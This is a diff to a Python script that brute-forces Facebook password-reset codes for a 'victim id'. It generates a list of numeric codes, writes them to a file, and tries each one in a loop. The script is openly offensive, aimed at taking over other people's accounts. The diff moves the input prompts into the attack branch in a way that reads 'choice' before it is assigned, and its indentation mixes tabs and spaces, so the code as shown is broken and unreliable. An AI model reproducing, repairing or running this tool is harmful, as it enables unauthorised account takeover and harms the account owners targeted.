@@ -17,9 +17,6 @@ print('''
     ============ Menu ==============
     1- Reset Code Facebook 
     0- To Exit''')
-choice=input(Fore.YELLOW+"Enter your choice : ")
-
-print(Style.RESET_ALL) 
 with open ('codes.txt','w') as f:
 	for i in range(first_code,last_code):
 		if len(str(i))<=5:
@@ -62,9 +59,13 @@ def function(passw):
 	else:
 		print('false')
 
-target=input(Back.GREEN+'Enter you victim id :> ')
 
 if choice =='1':
+                choice=input(Fore.YELLOW+"Enter your choice : ")
+
+                print(Style.RESET_ALL)
+                target=input(Back.GREEN+'Enter you victim id :> ')
+
 		f= open('codes.txt', 'r',encoding='utf-8')
 		w=f.read()
 		print(Fore.RED+"Facebook code loaded \!/\n")
@@ -73,5 +74,6 @@ if choice =='1':
 		for k in l:
 				print(Fore.RED+'trying ..',k)
 				function(k)
-	
+else:
+      exit(0)
     
